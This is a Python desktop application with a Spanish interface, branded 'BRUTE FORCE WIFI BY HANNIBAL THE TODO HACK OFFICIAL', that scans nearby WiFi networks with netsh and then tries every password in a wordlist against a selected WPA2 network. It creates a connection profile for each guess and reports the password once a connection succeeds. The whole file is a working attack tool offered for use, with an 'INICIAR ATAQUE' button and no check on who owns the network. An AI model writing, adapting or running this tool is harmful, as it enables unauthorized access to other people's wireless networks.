import flet as ft
import subprocess
import threading
import time
from datetime import datetime
import os
import webbrowser
import re

class WiFiAuditTool:
    def __init__(self, page: ft.Page):
        self.page = page
        self.setup_app()
        self.setup_ui()
        self.init_page()
        self.detect_wifi_interfaces()

    def setup_app(self):
        self.page.title = "TODO HACK OFFICIAL"
        self.page.window_width = 900
        self.page.window_height = 650
        self.page.theme_mode = ft.ThemeMode.DARK
        
        self.netsh_path = r"C:\Windows\System32\netsh.exe"
        self.temp_profile_path = os.path.join(os.environ['TEMP'], "wifi_temp_profile.xml")
        
        self.scanning = False
        self.attacking = False
        self.selected_network = None
        self.wordlist = os.path.join(os.path.dirname(__file__), "wordlist.txt")
        self.available_interfaces = []
        self.found_password = None
        self.current_interface = None

    def setup_ui(self):
        self.wifi_list = ft.ListView(
            expand=True, 
            spacing=10
        )
        
        self.console_output = ft.Column(
            [
                ft.Text("CONSOLA DE LOG:", weight=ft.FontWeight.BOLD),
                ft.Container(
                    content=ft.Column([], scroll=ft.ScrollMode.ALWAYS, spacing=2, height=200),
                    border=ft.border.all(1, ft.colors.GREY_700),
                    border_radius=5,
                    padding=10,
                    bgcolor=ft.colors.BLACK,
                    height=200,
                )
            ],
            expand=False
        )
        
        self.interface_dropdown = ft.Dropdown(
            label="INTERFAZ WIFI PREDETERMINADA", 
            options=[], 
            width=400,
            on_change=self.interface_changed
        )
        
        self.scan_button = ft.ElevatedButton(
            "ESCANEAR REDES", 
            icon=ft.icons.WIFI_FIND, 
            on_click=self.start_scan, 
            width=200
        )
        
        self.stop_scan_button = ft.ElevatedButton(
            "DETENER ESCANEO", 
            icon=ft.icons.STOP, 
            on_click=self.stop_scan, 
            width=200, 
            disabled=True
        )
        
        self.wordlist_input = ft.TextField(
            label="RUTA DE WORDLIST", 
            value=self.wordlist, 
            width=300
        )
        
        self.browse_button = ft.ElevatedButton(
            content=ft.Row(
                [
                    ft.Icon(ft.icons.FOLDER_OPEN),
                    ft.Text("EXAMINAR", size=14)
                ],
                alignment=ft.MainAxisAlignment.CENTER,
            ),
            on_click=self.browse_wordlist, 
            width=100
        )
        
        self.attack_button = ft.ElevatedButton(
            "INICIAR ATAQUE",
            icon=ft.icons.SECURITY,
            on_click=self.start_attack,
            width=200,
            disabled=True,
            bgcolor=ft.colors.RED_700
        )
        
        self.stop_attack_button = ft.ElevatedButton(
            "DETENER ATAQUE",
            icon=ft.icons.STOP,
            on_click=self.stop_attack,
            width=200,
            disabled=True,
            bgcolor=ft.colors.ORANGE_700
        )
        
        self.status_indicator = ft.Container(
            width=20, 
            height=20, 
            border_radius=10, 
            bgcolor=ft.colors.GREY_600
        )
        
        self.status_text = ft.Text("INACTIVO", color=ft.colors.GREY_400)
        
        self.password_found_display = ft.Column(
            [
                ft.Text("CONTRASEÑA ENCONTRADA:", 
                       size=18, 
                       weight=ft.FontWeight.BOLD, 
                       color=ft.colors.GREEN),
                ft.Text("Red: ", selectable=True, size=16),
                ft.Text("Contraseña: ", selectable=True, size=16)
            ],
            spacing=5,
            visible=False
        )
        
        self.discord_button = ft.ElevatedButton(
            "NUESTRO DISCORD",
            icon=ft.icons.DISCORD,
            on_click=lambda _: webbrowser.open("https://discord.gg/Zcq7GD3FFH"),
            width=200,
            bgcolor=ft.colors.BLUE_700
        )

    def init_page(self):
        self.page.add(
            ft.Column(
                [
                    ft.Row(
                        [
                            ft.Icon(ft.icons.SHIELD, size=30, color=ft.colors.BLUE),
                            ft.Text("BRUTE FORCE WIFI BY HANNIBAL THE TODO HACK OFFICIAL", 
                                  size=24, 
                                  weight=ft.FontWeight.BOLD),
                            ft.Container(width=20),
                            self.discord_button
                        ],
                        alignment=ft.MainAxisAlignment.CENTER
                    ),
                    
                    ft.Divider(height=10),
                    
                    ft.Row(
                        [
                            self.interface_dropdown,
                            ft.VerticalDivider(width=20),
                            self.scan_button,
                            self.stop_scan_button
                        ],
                        alignment=ft.MainAxisAlignment.START
                    ),
                    
                    ft.Divider(height=10),
                    
                    ft.Row(
                        [
                            ft.Column(
                                [
                                    ft.Text("REDES WIFI DETECTADAS:", 
                                          size=18, 
                                          weight=ft.FontWeight.BOLD),
                                    ft.Container(
                                        content=self.wifi_list,
                                        border=ft.border.all(1, ft.colors.GREY_700),
                                        border_radius=5,
                                        padding=10,
                                        expand=True,
                                        height=300
                                    )
                                ],
                                expand=True
                            ),
                            
                            ft.VerticalDivider(width=10),
                            
                            ft.Column(
                                [
                                    ft.Text("AGREGA UNA WORDLIST:", 
                                           size=18, 
                                           weight=ft.FontWeight.BOLD),
                                    ft.Row(
                                        [self.wordlist_input, self.browse_button], 
                                        alignment=ft.MainAxisAlignment.START
                                    ),
                                    ft.Row(
                                        [self.attack_button, self.stop_attack_button], 
                                        spacing=20
                                    ),
                                    ft.Divider(height=20),
                                    self.password_found_display,
                                    ft.Row(
                                        [self.status_indicator, self.status_text], 
                                        spacing=10
                                    ),
                                    self.console_output
                                ],
                                width=400
                            )
                        ],
                        expand=True,
                        spacing=20
                    )
                ],
                expand=True,
                spacing=10
            )
        )
        self.log_to_console("ERROR: SELECCIONE UNA RED PARA COMENZAR EL ATAQUE.")

    def log_to_console(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = ft.Text(
            f"[{timestamp}] {message}", 
            color=ft.colors.WHITE, 
            size=12, 
            selectable=True
        )
        
        console_content = self.console_output.controls[1].content.controls
        if len(console_content) > 100:
            console_content.pop(0)
        
        console_content.append(log_entry)
        self.console_output.controls[1].content.scroll_to(offset=float('inf'), duration=300)
        self.page.update()

    def update_status(self, active, message, color):
        self.status_indicator.bgcolor = color
        self.status_text.value = message
        self.status_text.color = color
        self.page.update()

    def interface_changed(self, e):
        self.current_interface = self.interface_dropdown.value
        self.log_to_console(f"INTERFAZ SELECCIONADA: {self.current_interface}")

    def detect_wifi_interfaces(self):
        try:

            command = f'"{self.netsh_path}" wlan show interfaces'
            result = subprocess.run(command, capture_output=True, text=True, shell=True,
                                 creationflags=subprocess.CREATE_NO_WINDOW)
            
            interface_info = None
            interface_name = None
            interface_desc = None
            current_section = ""
            
            for line in result.stdout.split('\n'):
                line = line.strip()
                if not line:
                    continue
                    
                if ":" in line:
                    name, value = line.split(':', 1)
                    name = name.strip()
                    value = value.strip()
                    
                    if "Nombre" in name:
                        interface_name = value
                        current_section = "interface"
                    elif "Descripción" in name and current_section == "interface":
                        interface_desc = value
                        break  
            
            if interface_name:  
                self.current_interface = interface_name  
                
                display_name = interface_desc if interface_desc else interface_name
                display_name = display_name.split('802.11')[0].strip()  
                display_name = display_name.replace("Wireless", "").replace("Adapter", "").strip()
                
                self.interface_text = ft.Text(
                    display_name,
                    size=16,
                    color=ft.colors.WHITE,
                    weight=ft.FontWeight.BOLD
                )
                
                self.interface_dropdown = self.interface_text
                self.page.update()
                
                self.log_to_console(f"INTERFAZ WIFI DETECTADA: {display_name}")
                self.start_scan(None)
            else:
                self.log_to_console("ERROR: ASEGURATE DE QUE EL WIFI ESTE ACTIVADO")
                
        except Exception as e:
            self.log_to_console(f"ERROR AL DETECTAR INTERFAZ WIFI: {str(e)}")
            self.log_to_console("INTENTE EJECUTAR EL PROGRAMA COMO ADMINITRADOR")

    def start_scan(self, e):
        if not self.current_interface:
            self.log_to_console("ERROR: NO SE DETECTONINGUNA INTERFAZ WIFI")
            return
        
        self.scanning = True
        self.scan_button.disabled = True
        self.stop_scan_button.disabled = False
        self.wifi_list.controls.clear()
        self.selected_network = None
        self.attack_button.disabled = True
        self.update_status(True, "ESCANEANDO...", ft.colors.BLUE)
        self.log_to_console(f"INICIANDO ESCANEO AUTOMATICO {self.current_interface}")
        
        threading.Thread(target=self.scan_wifi_networks, daemon=True).start()

    def scan_wifi_networks(self):
        try:
            command = f'"{self.netsh_path}" wlan show networks mode=bssid interface="{self.current_interface}"'
            self.scan_process = subprocess.Popen(
                command, 
                stdout=subprocess.PIPE, 
                stderr=subprocess.PIPE, 
                shell=True, 
                text=True, 
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            networks = []
            current_network = {}
            
            while self.scanning:
                line = self.scan_process.stdout.readline()
                if not line and self.scan_process.poll() is not None:
                    break
                
                line = line.strip()
                
                if "SSID" in line and "BSSID" not in line:
                    if current_network:
                        networks.append(current_network)
                    ssid = line.split(":")[1].strip()
                    if not ssid:  
                        continue
                    current_network = {
                        "SSID": ssid,
                        "BSSIDs": [],
                        "Auth": "N/A",
                        "Encryption": "N/A",
                        "Signal": "N/A"
                    }
                elif "BSSID" in line and current_network:
                    current_network["BSSIDs"].append(line.split(":")[1].strip())
                elif "Autenticación" in line and current_network:
                    current_network["Auth"] = line.split(":")[1].strip()
                elif "Cifrado" in line and current_network:
                    current_network["Encryption"] = line.split(":")[1].strip()
                elif "Señal" in line and current_network:
                    current_network["Signal"] = line.split(":")[1].strip()
                
                if len(networks) % 3 == 0:
                    self.update_wifi_list(networks + [current_network] if current_network else networks)
                    self.page.update()
            
            if current_network and current_network.get("SSID"):
                networks.append(current_network)
            
            self.update_wifi_list(networks)
            self.log_to_console(f"ESCANEO COMPLETADO. {len(networks)} REDES ENCONTRADAS.")
            
        finally:
            if hasattr(self, 'scan_process') and self.scan_process:
                self.scan_process.terminate()
                self.scan_process = None

    def update_wifi_list(self, networks):
        self.wifi_list.controls.clear()
        
        for network in networks:
            if "SSID" not in network:
                continue
                
            ssid = network["SSID"]
            auth = network.get("Auth", "N/A")
            
            icon_color = ft.colors.GREEN if "WPA2" in auth or "WPA3" in auth else \
                        ft.colors.YELLOW if "WPA" in auth else \
                        ft.colors.ORANGE if "WEP" in auth else \
                        ft.colors.RED
            
            network_card = ft.Card(
                content=ft.Container(
                    content=ft.Column([
                        ft.ListTile(
                            leading=ft.Icon(ft.icons.WIFI, color=icon_color),
                            title=ft.Text(ssid),
                            subtitle=ft.Text(
                                f"AUTH: {auth} | SEÑAL: {network.get('Signal', 'N/A')}\n"
                                f"CIFRADO: {network.get('Encryption', 'N/A')}"
                            ),
                            on_click=lambda e, ssid=ssid: self.select_network(ssid)
                        )
                    ]),
                    width=400,
                    padding=10,
                )
            )
            self.wifi_list.controls.append(network_card)

    def select_network(self, ssid):
        if not isinstance(ssid, str):  
            if hasattr(ssid, 'control') and hasattr(ssid.control, 'title'):
                ssid = ssid.control.title.value
            else:
                return
        
        self.selected_network = ssid
        self.attack_button.disabled = False
        self.found_password = None
        self.password_found_display.visible = False
        
        for control in self.wifi_list.controls:
            if isinstance(control, ft.Card):
                tile = control.content.content.controls[0]
                tile.selected = (tile.title.value == ssid)
        
        self.page.update()
        self.log_to_console(f"RED SELECCIONADA: {ssid}")

    def start_attack(self, e):
        if not self.selected_network:
            self.log_to_console("ERROR: NO HA SELECCIONANDO UNA RED")
            return
        
        if not os.path.exists(self.wordlist):
            self.log_to_console(f"ERROR: EL ARCHIVO WORDLIST ESTA VACIO O NO SELECCIONADO: {self.wordlist}")
            return
        
        self.attacking = True
        self.attack_button.disabled = True
        self.stop_attack_button.disabled = False
        self.found_password = None
        self.password_found_display.visible = False
        self.update_status(True, "ATACANDO...", ft.colors.RED)
        self.log_to_console(f"INICIANDO ATAQUE {self.selected_network}")
        
        threading.Thread(target=self.run_password_audit, daemon=True).start()

    def run_password_audit(self):
        try:

            self.console_output.controls[1].content.controls.clear()
            self.page.update()

            with open(self.wordlist, 'r', encoding='utf-8', errors='ignore') as f:
                passwords = [line.strip() for line in f if line.strip()]
            
            if not passwords:
                self.log_to_console("ERROR: WORDLIST VACIA")
                return
            
            total = len(passwords)
            self.log_to_console(f"INICIANDO PRUEBA {total} CONTRASEÑAS...")
            
            self.disconnect_wifi()
            time.sleep(1)
            
            for i, password in enumerate(passwords, 1):
                if not self.attacking:
                    break
                
                self.log_to_console(f"PROBANDO ({i}/{total}): {password}")
                
                profile = f"""<?xml version="1.0"?>
                <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
                    <name>{self.selected_network}</name>
                    <SSIDConfig><SSID><name>{self.selected_network}</name></SSID></SSIDConfig>
                    <connectionType>ESS</connectionType>
                    <connectionMode>auto</connectionMode>
                    <MSM>
                        <security>
                            <authEncryption>
                                <authentication>WPA2PSK</authentication>
                                <encryption>AES</encryption>
                                <useOneX>false</useOneX>
                            </authEncryption>
                            <sharedKey>
                                <keyType>passPhrase</keyType>
                                <protected>false</protected>
                                <keyMaterial>{password}</keyMaterial>
                            </sharedKey>
                        </security>
                    </MSM>
                </WLANProfile>"""
                
                with open(self.temp_profile_path, 'w', encoding='utf-8') as f:
                    f.write(profile)
                
                # Intentar conexión
                subprocess.run(
                    f'"{self.netsh_path}" wlan add profile filename="{self.temp_profile_path}"',
                    shell=True, capture_output=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                connect_result = subprocess.run(
                    f'"{self.netsh_path}" wlan connect name="{self.selected_network}"',
                    shell=True, capture_output=True, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                
                if "correctamente" in connect_result.stdout.lower():
                    if self.verify_connection_robust():
                        self.found_password = password
                        self.attacking = False
                        
                        self.log_to_console("=" * 50)
                        self.log_to_console("¡CONTRASEÑA ENCONTRADA!")
                        self.log_to_console(f"RED: {self.selected_network}")
                        self.log_to_console(f"CONTRASEÑA: {password}")
                        self.log_to_console("=" * 50)
                        
                        self.password_found_display.controls[1].value = f"RED: {self.selected_network}"
                        self.password_found_display.controls[2].value = f"CONTRASEÑA: {password}"
                        self.password_found_display.visible = True
                        self.attack_button.disabled = False
                        self.stop_attack_button.disabled = True
                        self.update_status(False, "¡CNTRASEÑA ENCONTRADA!", ft.colors.GREEN)
                        self.page.update()
                        return
                
                self.disconnect_wifi()
                time.sleep(1)
            
            self.log_to_console("PROSESO COMPLETADO. NO SE ENCONTRARON CONTRASEÑAS.")
            
        except Exception as e:
            self.log_to_console(f"ERROR: {str(e)}")
        finally:
            if not self.found_password:
                self.disconnect_wifi()
                self.update_status(False, "INACTIVO", ft.colors.GREY)
            self.attacking = False
            self.page.update()

    def verify_connection_robust(self):

        try:

            max_attempts = 3  
            wait_time = 2  
            
            for attempt in range(max_attempts):
                self.log_to_console(f"VERIFICANDO CONEXION (INTENTO {attempt + 1}/{max_attempts})...")
                
                if self.check_initial_connection():
                    self.log_to_console("SE DETECTO UNA CONEXCION...")
                    time.sleep(wait_time)  
                    
                    if self.check_authentication_state():
                        self.log_to_console("¡AUTENTICACION EXITOSA!")
                        return True
                
                time.sleep(wait_time)  
            
            return False
            
        except Exception as e:
            self.log_to_console(f"ERROR EN LA VERIFCACION: {str(e)}")
            return False

    def check_initial_connection(self):

        try:

            status = subprocess.run(
                f'"{self.netsh_path}" wlan show interface',
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=2
            )
            
            output = status.stdout.lower()
            if self.selected_network.lower() in output:
                if any(state in output for state in [
                    "conectado",
                    "connected",
                    "asociado",
                    "associated"
                ]):
                    return True
            
            return False
        except:
            return False

    def check_authentication_state(self):

        try:

            checks = [

                lambda: self.check_interface_state(),
                
                lambda: self.check_dhcp_state(),
                
                lambda: self.check_connection_details()
            ]
            
            return any(check() for check in checks)
            
        except:
            return False

    def check_interface_state(self):

        try:
            status = subprocess.run(
                f'"{self.netsh_path}" wlan show interface',
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=2
            )
            
            return "estado" in status.stdout.lower() and any(
                state in status.stdout.lower() for state in [
                    "autenticado",
                    "authenticated",
                    "conectado",
                    "connected"
                ]
            )
        except:
            return False

    def check_dhcp_state(self):

        try:
            ipconfig = subprocess.run(
                "ipconfig",
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=2
            )
            
            return any(
                indicator in ipconfig.stdout.lower() for indicator in [
                    "ipv4",
                    "dirección ip",
                    "ip address",
                    "puerta de enlace",
                    "gateway"
                ]
            )
        except:
            return False

    def check_connection_details(self):

        try:
            details = subprocess.run(
                f'"{self.netsh_path}" wlan show networks mode=bssid | findstr "{self.selected_network}"',
                shell=True, capture_output=True, text=True,
                creationflags=subprocess.CREATE_NO_WINDOW,
                timeout=2
            )
            
            if self.selected_network in details.stdout:
                signal_check = subprocess.run(
                    f'"{self.netsh_path}" wlan show interface | findstr "Señal"',
                    shell=True, capture_output=True, text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW,
                    timeout=2
                )
                
                if "%" in signal_check.stdout:
                    try:
                        signal = int(signal_check.stdout.split("%")[0].split()[-1])
                        return signal > 30 
                    except:
                        pass
            
            return False
        except:
            return False

    def disconnect_wifi(self):

        try:

            subprocess.run(
                f'"{self.netsh_path}" wlan disconnect interface="{self.current_interface}"',
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            time.sleep(1)
            
            subprocess.run(
                f'"{self.netsh_path}" wlan delete profile name="{self.selected_network}" interface="{self.current_interface}"',
                shell=True, 
                capture_output=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            return True
        except Exception as e:
            self.log_to_console(f"ERROR AL DESCONETAR: {str(e)}")
            return False

    def stop_attack(self, e):

        try:
            self.attacking = False
            self.attack_button.disabled = False
            self.stop_attack_button.disabled = True
            
            self.disconnect_wifi()
            
            subprocess.run(
                f'"{self.netsh_path}" wlan delete profile name="{self.selected_network}"',
                shell=True, creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            self.update_status(False, "INACTIVO", ft.colors.GREY)
            self.log_to_console("ATAQUE DETENIDO POR EL USUARIO")
            
            self.page.update()
            
        except Exception as e:
            self.log_to_console(f"ERROR AL DETENER: {str(e)}")

    def stop_scan(self, e):
        try:
            self.scanning = False
            self.scan_button.disabled = False
            self.stop_scan_button.disabled = True
            self.update_status(False, "INACTIVO", ft.colors.GREY)
            self.log_to_console("DETENIENDO ESCANEO...")
            
            if hasattr(self, 'scan_process') and self.scan_process:
                subprocess.run(
                    f"taskkill /F /PID {self.scan_process.pid}",
                    shell=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                self.scan_process = None
            
            self.page.update()
        except Exception as e:
            self.log_to_console(f"ERROR AL DETENER ESCANEO: {str(e)}")

    def browse_wordlist(self, e):
        def on_dialog_result(e: ft.FilePickerResultEvent):
            if e.files:
                self.wordlist = e.files[0].path
                self.wordlist_input.value = self.wordlist
                self.page.update()
                self.log_to_console(f"WORDLIST SELECCIONADA: {self.wordlist}")
        
        file_picker = ft.FilePicker(on_result=on_dialog_result)
        self.page.overlay.append(file_picker)
        self.page.update()
        file_picker.pick_files(
            dialog_title="SELECIONAR WORDLIST", 
            allowed_extensions=["txt"],
            initial_directory=os.path.dirname(self.wordlist) if os.path.exists(self.wordlist) else None
        )

def main(page: ft.Page):
    WiFiAuditTool(page)

if __name__ == "__main__":

    ft.app(target=main)
